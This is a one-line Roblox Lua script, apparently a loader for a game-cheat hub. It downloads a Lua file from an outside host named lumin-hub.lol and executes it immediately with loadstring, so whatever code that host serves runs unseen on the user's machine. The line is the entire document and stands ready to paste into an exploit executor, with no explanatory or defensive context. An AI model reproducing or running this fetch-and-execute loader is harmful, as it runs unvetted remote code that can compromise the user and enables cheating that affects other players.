loadstring(game:HttpGet("http://lumin-hub.lol/Blade.lua"))()
